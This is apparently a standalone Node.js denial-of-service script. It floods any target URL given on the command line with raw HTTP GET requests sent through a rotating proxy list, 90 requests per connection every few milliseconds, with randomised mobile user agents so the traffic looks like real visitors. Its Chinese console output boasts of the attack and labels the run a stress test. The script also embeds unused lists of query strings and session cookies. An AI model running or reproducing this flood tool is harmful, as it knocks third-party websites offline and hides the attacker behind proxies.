process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'UTF-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
    if (err.code !== 'ENOENT') throw err;
    console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

var target = process.argv[2];
var parsed = url.parse(target);

setTimeout(() => {
    process.exit(7);
}, process.argv[4] * 1000);


const UAs = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; U; Android 9; zh-cn; MI 9 Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.3.3",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.85 Mobile Safari/537.36",
    // 其他用户代理...
];


setInterval(function() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000);
    socket.once('error', err => {
        // console.log('Error : ' + proxy[0] + ":" + proxy[1]);
    });
    socket.once('disconnect', () => {
        console.log('Disconnect');
    });
    socket.once('data', data => {
        // console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
    });
    for (let j = 0; j < 90; j++) {
        socket.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
var GD = [
    "/?r=*****",
    "/?r=12364",
    "/?r=16364",
    "/?r=65655",
    "/?r=65955",
    "/?r=14254",
    "/?r=12654",
    "/?r=66455",
    "/?r=18694",
    "/?r=12364",
    "/?r=6566664645",
    "/?r=125234",
    "/?r=16365",
    "/?r=16354",
    "/?r=123964",
    "/?r=656664645",
    "/?r=12524",
    "/?r=163665",
    "/?r=16354",
    "/?r=12334",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F1]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F16685]&b=[+N5]",
    "/?a=[+F8551]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F56551]&b=[+N5]",
    "/?a=[+F1350]&b=[+N52]",
    "/?a=[+F1520]&b=[+N52]",
    "/?uername=zlq&age=20",
    "/?uername=zlq&age=2",
    "/?yqlaje=an4ux1&amp;__CBK=3f3c8201870c33a8b8c92687ed8a1698d1603344084_326369&amp;wmnqjm=agpws2&amp;naxyty=jxxv22&amp;fktade=draxv1&amp;qybcjc=4pyt12&amp;vunwfk=dgwq82&qifuha=gk0u32",
    ];
//        let KK = fs.readFileSync('baidu.txt', 'utf-8').match(/\S+/g);
var KK = [
   "PHPSESSID=9vgqs235r45g9qfcpqcqikv86q; mysid=1cf6bb6e36491d53c0f9fc261cfbb792; counter=1; Hm_lvt_b4a4918d5abe40ec265dbc08481d477a=1603519390; Hm_lpvt_b4a4918d5abe40ec265dbc08481d477a=1603519390",
   "PHPSESSID=vj2qrg9j181qvdtavd8t8p7jd0; _ga=GA1.2.243460572.1603519150; _gid=GA1.2.729864228.1603519150; _gat=1",
   "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
   "9WoS_2132_saltkey=zl3E3rvm; 9WoS_2132_lastvisit=1603425355; 9WoS_2132_lastact=1603428955%09forum.php%09; 9WoS_2132_onlineusernum=1",
   "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
   ];
    }

    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 130000);
    })
}, 3);
if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}
if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (!process.argv[4]) {
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (isNaN(process.argv[4])) {
    console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
    console.log("\x1b[31m Error\x1b[37m: enter valid target");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

console.log("可乐攻击，谁与争锋".rainbow);
console.log("\x1b[36m目标\x1b[37m  %s | " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);
console.log("目标提交成功,本次测压时间为 %s 秒", process.argv[4]);









